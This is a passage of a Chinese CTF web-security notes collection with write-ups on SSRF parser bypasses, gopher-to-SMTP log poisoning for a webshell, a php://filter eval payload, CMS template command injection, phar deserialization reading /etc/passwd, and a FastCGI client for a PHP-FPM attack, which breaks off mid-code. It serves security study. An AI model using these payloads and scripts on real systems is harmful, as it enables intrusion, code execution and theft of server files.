<p>readfile()\u51fd\u6570\u83b7\u53d6\u7684\u662f@\u53f7\u540e\u9762\u4e00\u90e8\u5206\uff08evil.com\uff09\uff0c\u800cparse_url()\u51fd\u6570\u83b7\u53d6\u7684\u5219\u662f@\u53f7\u524d\u9762\u7684\u4e00\u90e8\u5206\uff08google.com\uff09\uff0c\u5229\u7528\u8fd9\u79cd\u5dee\u5f02\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9898\u76ee\u4e2dparse_url()\u51fd\u6570\u5bf9\u6307\u5b9ahost\u7684\u9650\u5236\u3002</p> <p>\uff082\uff09\u5229\u7528curl\u548cparse_url\u7684\u89e3\u6790\u5dee\u5f02\u7ed5\u6307\u5b9a\u7684host</p> <p>\u539f\u7406\u5982\u4e0b\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230curl()\u51fd\u6570\u89e3\u6790\u7684\u662f\u7b2c\u4e00\u4e2a@\u540e\u9762\u7684\u7f51\u5740\uff0c\u800cparse_url()\u51fd\u6570\u89e3\u6790\u7684\u662f\u7b2c\u4e8c\u4e2a@\u540e\u9762\u7684\u7f51\u5740\u3002\u5229\u7528\u8fd9\u4e2a\u539f\u7406\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9898\u76ee\u4e2dparse_url()\u51fd\u6570\u5bf9\u6307\u5b9ahost\u7684\u9650\u5236\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>&lt;?phphighlight_file(__FILE__);function check_inner_ip($url){    $match_result=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url);    if (!$match_result)    {        die('url fomat error');    }    try    {        $url_parse=parse_url($url);    }    catch(Exception $e)    {        die('url fomat error');        return false;    }    $hostname=$url_parse['host'];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16;// \u68c0\u67e5\u662f\u5426\u662f\u5185\u7f51ip}function safe_request_url($url){    if (check_inner_ip($url))    {        echo $url.' is inner ip';    }    else    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info['redirect_url'])        {            safe_request_url($result_info['redirect_url']);        }        curl_close($ch);        var_dump($output);    }}$url = $_GET['url'];if(!empty($url)){    safe_request_url($url);}?&gt;\nPlain Text\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230<code>check_inner_ip</code>\u51fd\u6570\u901a\u8fc7<code>url_parse()</code>\u51fd\u6570\u68c0\u6d4b\u662f\u5426\u4e3a\u5185\u7f51IP\uff0c\u5982\u679c\u4e0d\u662f\u5185\u7f51 IP \uff0c\u5219\u901a\u8fc7<code>curl()</code>\u8bf7\u6c42 url \u5e76\u8fd4\u56de\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528curl\u548cparse_url\u89e3\u6790\u7684\u5dee\u5f02\u4e0d\u540c\u6765\u7ed5\u8fc7\u8fd9\u91cc\u7684\u9650\u5236\uff0c\u8ba9<code>parse_url()</code>\u5904\u7406\u5916\u90e8\u7f51\u7ad9\u7f51\u5740\uff0c\u6700\u540e<code>curl()</code>\u8bf7\u6c42\u5185\u7f51\u7f51\u5740\u3002paylaod\u5982\u4e0b\uff1a</p> <pre><code>ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\nPlain Text\n</code></pre> <p></p> <p>\u7684 [2020 \u9996\u5c4a\u201c\u7965\u4e91\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b]doyouknowssrf\u8fd9\u9053\u9898\u5229\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u601d\u8def\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/%E4%B8%BE%E4%BE%8B%E4%BE%8B%E9%A2%98/","title":"\u4e3e\u4f8b\u4f8b\u9898","text":"<pre><code>&lt;?php\nhighlight_file(__FILE__);\n$x = $_GET['x'];\n$pos = strpos($x,\"php\");\nif($pos){\n        exit(\"denied\");\n}\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,\"$x\");\ncurl_setopt($ch,CURLOPT_RETURNTRANSFER,true);\n$result = curl_exec($ch);\necho $result;\nPlain Text\n</code></pre> <p>\u9996\u5148x\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c</p> <p>x\u53ef\u5229\u7528\u7684\u534f\u8bae\u6709gopher\u3001dict\u3001http\u3001https\u3001file\u7b49</p> <p>ps:\u7ecf\u5e38gopher\u534f\u8bae\u662f\u4f1a\u7ed9\u63d0\u793a\u7684\uff08\u6bd4\u5982\u7ed9\u51fa\u534f\u8bae\uff1aXXX\u534f\u8bae\u8fc7\u6ee4\u540e\u53d1\u73b0\u5c31\u8fd9\u4e2a\u80fd\u7528\u6216\u8005\u76f4\u63a5\u653e\u5728\u767d\u540d\u5355\u91cc\u9762\u63d0\u793a\uff09</p> <p>file\u534f\u8bae\u53ef\u4ee5\u7528\u4e8e\u67e5\u770b\u6587\u4ef6</p> <p>dict\u534f\u8bae\u53ef\u4ee5\u7528\u4e8e\u523a\u63a2\u7aef\u53e3</p> <p>gopher\u534f\u8bae\u652f\u6301GET&amp;POST\u8bf7\u6c42\uff0c\u5e38\u7528\u4e8e\u653b\u51fb\u5185\u7f51ftp\u3001redis\u3001telnet\u3001smtp\u7b49\u670d\u52a1\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528gopher\u534f\u8bae\u8bbf\u95eeredis\u53cd\u5f39shell</p> <p>\u9996\u5148\u6211\u4eec\u5229\u7528file\u8bfb\u53d6\u6587\u4ef6</p> <p>\u5148\u4e0a\u811a\u672c\u626b\u63cf\u4e00\u4e0b\u76ee\u5f55\uff0c\u5f97\u5230flag.php\u3002</p> <p>\u4e00\u822c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8bfb\u53d6/etc/hosts\uff0c/etc/passwd\uff0c~/.bash_history\u7b49\u6587\u4ef6\u67e5\u770b\u7ebf\u7d22</p> <p>\u4f46\u662f\u4ee3\u7801\u4e2d\u6709strpos\u7684\u9650\u5236\uff08\u5229\u7528%2570\u7ed5\u8fc7\uff09</p> <p>\u6700\u540e\u6211\u4eec\u8bfb\u53d6/var/www/html/flag.php\u65f6\u53d1\u73b0\u7ebf\u7d22</p> <p></p> <p>\u7ee7\u7eed\u8bfb\u53d6<code>/etc/hosts</code>\u5f97\u5230\u4e00\u4e2a\u5185\u7f51\u5730\u5740</p> <p></p> <p>\u8fd9\u513f\u6211\u4eec\u5f97\u5230\u5185\u7f51\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u626b\u63cf\uff0c\u53d1\u73b0\u53ea\u6709172.18.0.1|2|3\u53ef\u4ee5\u8bbf\u95ee\u3002</p> <p>http://101.71.29.5:10012/?x=http://172.18.0.2\u7684\u8fd4\u56de\u7ed3\u679c\u5982\u4e0b\u56fe\uff0c\u5b58\u5728LFI\u6f0f\u6d1e\u3002</p> <p>\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0</p> <p>\u8fd9\u53ea\u662f80\u7aef\u53e3\u7684\u7ed3\u679c\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u770b\u770b\u5176\u4ed6\u7aef\u53e3\u7684\u5f00\u653e\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\uff0c25\u7aef\u53e3\u4e5f\u5f00\u653e\u4e86\uff0c25\u5bf9\u5e94\u7684\u5c31\u662fsmtp\u670d\u52a1</p> <p></p> <p>\u5229\u7528gopher\u534f\u8bae\u6253smtp\uff0c\u7136\u540e\u518d\u7ed3\u5408\u4e4b\u524d\u53d1\u73b0\u7684LFI\u6f0f\u6d1e\uff0c\u5f97\u51fa\u8fd9\u6837\u7684\u601d\u8def</p> <p>\u5229\u7528gopher\u6253smtp\uff0c\u5728\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7559\u4e0b\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u7136\u540e\u7528LFI\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u83b7\u53d6webshell</p> <p>\u601d\u8def\u6e05\u6670\u4e86\u540e\uff0c\u5c31\u5f00\u59cb\u6267\u884c\u4e86\uff0c\u5148\u7528gopherus\u811a\u672c\u751f\u6210payload\uff0cgopherus\u5730\u5740:https://github.com/tarunkant/Gopherus\uff0c\u91cc\u9762\u6709\u8be6\u7ec6\u7528\u6cd5\u3002</p> <p></p> <p>\u5c06127.0.0.1:25\u6539\u4e3a\u5185\u7f51\u5730\u5740\uff0c\u7136\u540eurl\u7f16\u7801\u53d1\u9001\u8fc7\u53bb</p> <p>\u7136\u540e\u6211\u4eec\u5229\u7528\u5305\u542b\u65e5\u5fd7\u6587\u4ef6</p> <p>\u4e8e\u662f\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u53bb\u627esmtp\u7684\u65e5\u5fd7\u6587\u4ef6\u4f4d\u7f6e\u4e86\uff0c\u4e00\u822c\u6765\u8bb2linux\u4e2d\u7684\u90ae\u4ef6\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\u4e3a</p> <p>/var/log/maillog</p> <p>/var/log/mail.log</p> <p>/var/adm/maillog</p> <p>/var/adm/syslog/mail.log</p> <p>\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0</p> <p>\u7136\u540e\u6211\u4eec\u76f4\u63a5\u8fde\u63a5\u83dc\u5200\u67e5\u770bflag</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/%E7%BB%83%E4%B9%A0/","title":"\u7ec3\u4e60","text":"<p>\u8fd9\u4f4d\u53cb\u597d\u7684\u4f5c\u8005\u8fd8\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u9776\u573a</p> <p>\u63a8\u8350\u4e00\u4e2aSSRF\u7ec3\u4e60\u9776\u573a\uff1a</p> <p>ssrf-lab\uff1a</p> <p>fengwenhua/ssrf-lab</p> <p>ssrf\u6f0f\u6d1e\u5b9e\u9a8c. Contribute to fengwenhua/ssrf-lab development by creating an account on GitHub.</p> <p>https://github.com/fengwenhua/ssrf-lab</p> <p></p> <p>\u8be5\u9776\u573a\u6709\u4e00\u4e2a\u597d\u770b\u53c8\u7b80\u6d01\u7684\u754c\u9762\uff0c\u63d0\u4f9b\u4e86\u6700\u57fa\u672c\u7684 REST API \u548c\u5ba2\u6237\u7aef WebHook \u529f\u80fd\u7528\u4e8e SSRF \u6d4b\u8bd5\u3002\u914d\u7f6e\u8bf7\u770b\uff1a</p> <p>SSRF \u6f0f\u6d1e\u5b66\u4e60\u5b9e\u9a8c\u73af\u5883\u63a8\u8350\u53ca\u8fc7\u7a0b\u8bb0\u5f55\u4e28\u4fe1\u5b89\u4e4b\u8def_\u5b89\u5168\u6587\u6458_\u9ed1\u767d\u7f51</p> <p>\u5728\u7f51\u4e0a\u627e\u5230\u4e00\u4e2a\u5b66\u4e60 SSRF \u7684\u73af\u5883\uff0cSSRF-LABS \u6709\u4e00\u4e2a\u597d\u770b\u53c8\u7b80\u6d01\u7684\u754c\u9762\uff0c\u63d0\u4f9b\u4e86\u6700\u57fa\u672c\u7684 REST API \u548c\u5ba2\u6237\u7aef WebHook \u529f\u80fd\u7528\u4e8e SSRF \u6d4b\u8bd5\u3002\u524d\u9762\u53ea\u662f\u5927\u6982\u7684\u4ecb\u7ecd\uff0c\u77e5\u9053\u5c31\u597d\uff0c\u4e0d\u7528\u82b1\u8d39\u8fc7\u591a\u7cbe\u529b\u4e86\u89e3\u3002SSRF \u4ecb\u7ecd\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u7528\u6237\u901a\u8fc7 WEB \u8bbf...</p> <p>https://www.heibai.org/post/1287.html</p>"},{"location":"web/ctf/WMCTF2020checkin2.0/","title":"WMCTF2020checkin2.0","text":"<p>WMCTF 2020 checkin2.0</p> <pre><code>&lt;?php\n2 //PHP 7.0.33 Apache/2.4.25\n3 error_reporting(0);\n4 $sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']);\n5 @mkdir($sandbox);\n6 @chdir($sandbox);\n7 highlight_file(__FILE__);\n8 if(isset($_GET['content'])) {\n9      $content = $_GET['content'];\n10     if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))\n11         die('hacker');\n12     if(file_exists($content))\n13         require_once($content);\n14         echo $content;\n15 file_put_contents($content,'&lt;?php exit();'.$content);\n16 }\n</code></pre> <p>\u6e90\u4ee3\u7801\u76f4\u63a5\u7ed9\u51fa\uff0c\u4ee3\u7801\u5ba1\u8ba1file_put_contents+require_once\uff0c\u6211\u4eec\u5c1d\u8bd5\u7528file_put_contents\u5199\u5165\u6587\u4ef6\u7136\u540e\u7528require_once\u5305\u542b\u7136\u540e\u62ff\u5230\u6743\u9650\u6216\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u5982\u679c\u6ca1\u6709\u660e\u9762\u4e0a\u7684\u8fc7\u6ee4\u548c\u540e\u53f0\u7684\u5bf9url\u7f16\u7801\u7684\u8fc7\u6ee4\uff0c\u90a3\u4e48\u4f1a\u6bd4\u8f83\u7b80\u5355\uff0c\u4f46\u8fd9\u91cc\u6709\u8fc7\u6ee4</p> <p>\u4e00\u5171\u6709\u4e09\u5929\u601d\u8def</p> <p>1.php 7.0.33\u4e34\u65f6\u6587\u4ef6\u5305\u542b\u7136\u540e\u7206\u7834\u51fa\u4fdd\u5b58\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u6700\u540egetshell</p> <p>2.\u4f2a\u534f\u8bae\u662f\u4f1a\u8fdb\u884c\u4e00\u6b21urldecode\uff0c\u5229\u7528\u4e8c\u6b21\u7f16\u7801\u7ed5\u8fc7\uff08\u6ca1\u5b9e\u73b0\u51fa\u6765\uff09</p> <p>3.zlib\u7684\u538b\u7f29\u52a0\u89e3\u538b\u7ed5\u8fc7\u4e2d\u95f4\u8fc7\u7a0b\u7684\u8fc7\u6ee4\u3002</p> <p><code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;/resource=aaa.php</code></p> <p>\u76f4\u63a5\u6446\u51fapayload\uff0c\u5229\u7528php\u4e2d\u7684\u8fc7\u6ee4\u5668\uff08\u9898\u76ee\u4e2d\u7684\u8fc7\u6ee4\u5c31\u662f\u4f2a\u534f\u8bae\u91cc\u9762\u7684\u8fc7\u6ee4\uff09</p> <p>\u6211\u4eec\u6765\u5c1d\u8bd5\u8fdb\u884c\u4e00\u4e0b\u5206\u6790\u3002</p> <p>content=<code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;/resource=aaa.php</code></p> <p>\u9996\u5148\u901a\u8fc7\u8fc7\u6ee4\u3002</p> <p>file\u4e0d\u5b58\u5728\u5f00\u59cb\u5199\u6587\u4ef6</p> <p>\u6587\u4ef6\u540d\u79f0\u4e3aaaa.php(\u4f2a\u534f\u8bae),\u6587\u4ef6\u5185\u5bb9\u4e3a&lt;?php exit();php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php</p> <p>eval($_GET[1]);?&gt;/resource=Cyc1e.php</p> <p>\u5728\u5bf9\u5b83\u8fdb\u884c\u5305\u542b\u7684\u65f6\u5019\u5b9e\u9645\u4f1a\u6267\u884c\u4e24\u7aefphp\u4ee3\u7801&lt;?php exit();php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;</p> <p>\u548c&lt;?php eval($_GET[1]);?&gt;\u518d\u8f93\u51fa\u4e00\u5c0f\u6bb5 /resource=Cyc1e.php\uff08\u6ca1\u6709\u8fdb\u5165php\u6267\u884c\u7684\u4ee3\u7801\u5757\u3002\uff09\u76f8\u5f53\u4e8e\u5bf9\u6700\u540e\u7684\u6587\u4ef6\u505a\u7ed5\u8fc7\u3002</p> <p>\u6700\u540e\u4f20\u53c21\u5373\u53ef\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u5b98\u65b9wp\u4e34\u65f6\u6587\u4ef6\u5305\u542b\u7684\u811a\u672c\uff1a</p> <pre><code>1 import requests\n2 import string\n3 import itertools\n4\n5 charset = string.digits + string.letters\n6\n7 host = \"web_checkin2.wmctf.wetolink.com\"\n8 port = 80\n9 base_url = \"http://%s:%d\" % (host, port)webweb\n10\n11\n12 def upload_file_to_include(url, file_content):\n13 files = {'file': ('evil.jpg', file_content, 'image/jpeg')}\n14 try:\n15 response = requests.post(url, files=files)\n16 except Exception as e:\n17 print e\n18\n19 def generate_tmp_files():\n20 file_content = '&lt;?php system(\"xxxxxxxx\");?&gt;'\nphpinfo_url = \"%s/?\ncontent=php://filter/write=string.strip_tags/resource=Cyc1e.php\" % (\n21\n22 base_url)\n23 print phpinfo_url\n24 length = 6\n25 times = len(charset) ** (length / 2)\n26 for i in xrange(times):\n27 print \"[+] %d / %d\" % (i, times)\n28 upload_file_to_include(phpinfo_url, file_content)\n29\n30 if __name__ == \"__main__\":\n31 generate_tmp_files()\n</code></pre> <p>https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</p> <p>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</p> <p>\u653e\u4e0a\u4e00\u7bc7\u6587\u7ae0\u3002</p>"},{"location":"web/ctf/%5BGKCTF2021%5Deasycms/","title":"[GKCTF2021]easycms","text":"<p>[GKCTF 2021]easycms</p> <p>\u5f53\u65f6\u7535\u8111py\u73af\u5883\u51fa\u4e86\u8f83\u5927\u95ee\u9898</p> <p>\u770b\u7740WP\u590d\u73b0\uff08\u4e0d\u662f\uff09</p> <p>\u540c\u65f6\u7a0d\u5fae\u4f5c\u70b9\u603b\u7ed3</p> <p>admin.php(buu\u4e0a\u626b\u4e0d\u4e86)</p> <p>admin + 12345\u5f31\u53e3\u4ee4\uff08\u5b8c\u5168\u53ef\u4ee5\u52a0\u4e2asql\u6ce8\u5165\uff09</p> <p>\u7136\u540e\u5c31\u89c1\u5230\u4e86\u6211\u4eec\u7684cms</p> <p></p> <p>\u6700\u5f00\u59cb\u51c6\u5907\u8bd5cms\u4e00\u4e9bcve\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u7684CVE\u5927\u591a\u6570\u90fd\u6709\u4e9b\u8001\uff0c\u6700\u65b0\u7684\u4e5f\u57286.x\u7248\u672c\uff0c\u800c\u8fd9\u4e2a\u662f7.x\u7248\u672c\uff0c\u4e0d\u5927\u7528\u7684\u4e86\u3002</p> <p>\u7136\u540e\u624b\u52a8\u722c\u7ad9</p> <p>\u6000\u7591\u8fc7\u8fd9\u4e2a</p> <p>\u6000\u7591\u8fd9\u4e2a\u662f\u56e0\u4e3a\u4e4b\u524d\u6709\u8fc7\u9898\u76ee\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u88ab\u7be1\u6539\u7684\u4e3b\u9898\u7136\u540e\u663e\u793a\u62ff\u5230\u6743\u9650\u3002</p> <p>\u7136\u540e\u5e76\u4e0d\u662f\uff0c\u4f46\u662f\u6709\u66f4\u4e3a\u53ef\u7591\u7684\u5730\u65b9\u3002</p> <p>\u53ef\u4ee5\u7f16\u8f91\u5168\u5c40\u6587\u4ef6\u7684\u5934\uff0c\u53ef\u4ee5\u770b\u51fa{}\u5305\u88f9\u7684nei\u5bb9\u56de\u88ab\u5f53\u6210\u662fphp\u4ee3\u7801\u6267\u884c\uff0c\u7c7b\u4f3c\u67d0\u79cd\u6a21\u677f</p> <p>\u70b9\u4fdd\u5b58\u7684\u65f6\u5019\u7ed9\u51fa\u4e86\u66f4\u4e3a\u5947\u602a\u7684\u8def\u5f84\uff0c\u4e5f\u5c31\u662f\u8bf4\u8981\u521b\u5efa\u4e00\u4e2a\u8fd9\u6837\u7684\u8def\u5f84\u3002</p> <p></p> <p>\u7531\u4e8e\u76ee\u524d\u8def\u5f84\u5728 /var/www/html/system/tmp/template/default/common/header.html.php\u4e4b\u4e0b\uff0c\u9700\u8981\u627e\u4e2a\u8def\u5f84\u7a7f\u8d8a\u7684\u70b9\u3002</p> <p>\u7136\u540e\u5c31\u6709\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u90a3\u5757</p> <p>\u7f16\u8f91\u6210\u8fd9\u4e2a\u6837\u5b50\uff08\u81ea\u52a8\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\uff09</p> <p>\u6700\u540e\u5728\u6a21\u677f\u4e2d\u6dfb\u52a0{!echo(system('cat /flag'))}</p> <p>\u8bbf\u95ee\u524d\u53f0\u5373\u53ef\u3002</p> <p></p>"},{"location":"web/ctf/%5BNCTF2019%5Dphar_matches_everything/","title":"[NCTF2019]phar matches everything","text":"<p>[NCTF2019]phar matches everything</p> <p>\u8fd9\u9898\u505a\u4e86\u6211\u5f88\u4e45\u5f88\u4e45\uff0c\u4f46\u73b0\u5728\u56de\u60f3\u8d77\u6765\u8fd8\u662f\u5341\u5206\u6709\u6536\u83b7</p> <p>\u957f\u94fe\u7684\u9898\u76ee\u4f1a\u7565\u663e\u7e41\u7410\u3002</p> <p>\u7ed9\u51fa\u6e90\u7801\uff1a</p> <pre><code>//catchmime.php\n&lt;?php\nclass Easytest{\nprotected $test;\npublic function funny_get(){\nreturn $this-&gt;test;\n}\n}\nclass Main {\npublic $url;\npublic function curl($url){\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,$url);\ncurl_setopt($ch,CURLOPT_RETURNTRANSFER,true);\n$output=curl_exec($ch);\ncurl_close($ch);\nreturn $output;\n}\n\npublic function __destruct(){\n$this_is_a_easy_test=unserialize($_GET['careful']);\nif($this_is_a_easy_test-&gt;funny_get() === '1'){\necho $this-&gt;curl($this-&gt;url);\n}\n}\n}\n\nif(isset($_POST[\"submit\"])) {\n$check = getimagesize($_POST['name']);\nif($check !== false) {\necho \"File is an image - \" . $check[\"mime\"] . \".\";\n} else {\necho \"File is not an image.\";\n}\n}\n?&gt;\n</code></pre> <p>\u6211\u4eec\u6765\u597d\u53f7\u770b\u770b\u6e90\u4ee3\u7801\uff0c\u5173\u6ce8\u70b9\u5728\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u3002</p> <ul> <li>curl\u51fd\u6570\u53ef\u4ee5\u8fdb\u884cssrf\u6216\u8005\u4efb\u610f\u6587\u4ef6\u8bfb\uff08file\u4f2a\u534f\u8bae\uff09</li> <li>getimagessize\u51fd\u6570\u7684\u7ed5\u8fc7\uff08GIF89A\u5934\uff09</li> <li>\u4e24\u4e2a\u7c7b\uff0c\u6784\u6790\u51fd\u6570\uff0cserialize\u51fd\u6570\uff08\u53cd\u5e8f\u5217\u5316\uff09</li> </ul> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u53cd\u5e8f\u5217\u5316\u7684\u5165\u53e3\u5728\u54ea\u3002</p> <p>\u7b54\u6848\u65f6phar\u4f2a\u534f\u8bae\u5728\u53cd\u5e8f\u5217\u5316\u4e2d\u7684\u8fd0\u7528\uff0c\u56e0\u4e3aphar\u540e\u7f00\u7684\u6587\u4ef6\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\uff0c\u518d\u5229\u7528phar://\u4f2a\u534f\u8bae\u8bfb\u53d6\u5185\u5bb9\u65f6\u5c31\u4f1a\u81ea\u52a8\u8c03\u7528unserialize()\u51fd\u6570\uff0c\u6210\u4e3a\u53cd\u5e8f\u5217\u5316\u7684\u5165\u53e3\uff0c\u6700\u540e\u8fdb\u5165__destruct\u51fd\u6570\u4e2d\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b65\u662fphar\u7684\u53cd\u5e8f\u5217\u5316\u70b9\u3002</p> <p>\u53cd\u5e8f\u5217\u5316\u7684\u94fe\u662fphar://------&gt;careful=(\u8c03\u7528funny_get())------&gt;curl\u8c03\u7528\uff0c\u8fd9\u91cc\u5176\u5b9e\u662f\u4e24\u4e2a\u53cd\u5e8f\u5217\u5316\u3002phar\u7684\u811a\u672c\u683c\u5f0f\u4f1a\u6bd4\u8f83\u56fa\u5b9a\uff0c\u4e0b=\u4e0b\u9762\u7684\u811a\u672c\u4e5f\u53ef\u4ee5\u5f53\u6210\u662f\u6a21\u677f\u6765\u4f7f\u7528\u3002\u800c\u4e14\u770b\u8d77\u6765\u4e5f\u8fd8\u662f\u86ee\u7b80\u5355\u7684\u3002</p> <pre><code>&lt;?php\nclass Easytest{\nprotected $test='1';\npublic function funny_get(){\nreturn $this-&gt;test;\n}\n}\nclass Main {\npublic $url;\n}\n\n\n$test = new EasyTest;\necho urlencode(serialize($test)).\"\\n\";\n\n$payload = new Main;\n$payload-&gt;url = \"file:///etc/passwd\";//\u6587\u4ef6\u6d41\u8bfb\u53d6\u6587\u4ef6\n\n$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');//GIF89A\u5934\n$phar = new Phar('exp.phar');\n$phar -&gt; startBuffering();\n$phar -&gt; setStub($png_header.'&lt;?php __HALT_COMPILER();?&gt;');\n$phar -&gt; addFromString('test.txt','test');\n$phar -&gt; setMetadata($payload);\n$phar -&gt; stopBuffering();\nrename(\"exp.phar\",\"exp.png\");//\u7531\u4e8e\u4e0a\u4f20\u6587\u4ef6\u6709\u540e\u7f00\u9650\u5236\u6539\u4e3apng\n?&gt;\n</code></pre> <p>\u6210\u529f\u4e4b\u540e\u80fd\u591f\u8bfb\u5230etc/passwd\u4e2d\u7684\u5185\u5bb9\u3002</p> <p>\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e1c\u897f\uff0c\u770b\u4e86\u4e0bwp(/etc/hosts)</p> <p>\u548c\u8bf4\u597d\u7684\u4e0d\u4e00\u6837\uff08\u607c\uff09</p> <p>\u7f51\u4e0a\u67e5\u4e86\u4e00\u4e0b\u8fd8\u6709\u4ec0\u4e48\u522b\u7684\u8bfbip\u7684\u4e1c\u897f\u6ca1\u6709\uff0c\u53d1\u73b0\u5728/proc/net/arp\u4e0b\u53d1\u73b0\u4e86\u5185\u7f51ip</p> <p></p> <p>\u5229\u7528http://10.0.16.11 \uff08\u4fee\u6539file://\u90a3\u91cc\uff09\u5c1d\u8bd5\u8bbf\u95ee\uff0c\u5f97\u5230\u4e86\u4e00\u4e2aPHP-FPM\u7684\u63d0\u793a</p> <p>\u63a5\u4e0b\u6765\u662fphp-fpm\u8ba4\u8bc1\u653b\u51fb\uff08\u653e\u5728\u53e6\u5916\u7684\u6587\u6863\u91cc\u9762\uff09</p> <pre><code>import socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\nimport base64\nimport urllib\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\nPY2 = True if sys.version_info.major == 2 else False\ndef bchr(i):\nif PY2:\nreturn force_bytes(chr(i))\nelse:\nreturn bytes([i])\ndef bord(c):\nif isinstance(c, int):\nreturn c\nelse:\nreturn ord(c)\ndef force_bytes(s):\nif isinstance(s, bytes):\nreturn s\nelse:\nreturn s.encode('utf-8', 'strict')\ndef force_text(s):\nif issubclass(type(s), str):\nreturn s\nif isinstance(s, bytes):\ns = str(s, 'utf-8', 'strict')\nelse:\ns = str(s)\nreturn s\nclass FastCGIClient:\n\"\"\"A Fast-CGI Client for Python\"\"\"\n# private\n__FCGI_VERSION = 1\n__FCGI_ROLE_RESPONDER = 1\n__FCGI_ROLE_AUTHORIZER = 2\n__FCGI_ROLE_FILTER = 3\n__FCGI_TYPE_BEGIN = 1\n__FCGI_TYPE_ABORT = 2\n__FCGI_TYPE_END = 3\n__FCGI_TYPE_PARAMS = 4\n__FCGI_TYPE_STDIN = 5\n__FCGI_TYPE_STDOUT = 6\n__FCGI_TYPE_STDERR = 7\n__FCGI_TYPE_DATA = 8\n__FCGI_TYPE_GETVALUES = 9\n__FCGI_TYPE_GETVALUES_RESULT = 10\n__FCGI_TYPE_UNKOWNTYPE = 11\n__FCGI_HEADER_SIZE = 8\n# request state\nFCGI_STATE_SEND = 1\nFCGI_STATE_ERROR = 2\nFCGI_STATE_SUCCESS = 3\ndef __init__(self, host, port, timeout, keepalive):\nself.host = host\nself.port = port\nself.timeout = timeout\nif keepalive:\nself.keepalive = 1\nelse:\nself.keepalive = 0\nself.sock = None\nself.requests = dict()\ndef __connect(self):\nself.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nself.sock.settimeout(self.timeout)\nself.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n# if self.keepalive:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n# else:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\ntry:\nself.sock.connect((self.host, int(self.port)))\nexcept socket.error as msg:\nself.sock.close()\nself.sock = None\nprint(repr(msg))\nreturn False\nreturn True\ndef __encodeFastCGIRecord(self, fcgi_type, content, requestid):\nlength = len(content)\nbuf = bchr(FastCGIClient.__FCGI_VERSION) \\\n+ bchr(fcgi_type) \\\n+ bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(requestid &amp; 0xFF) \\\n+ bchr((length 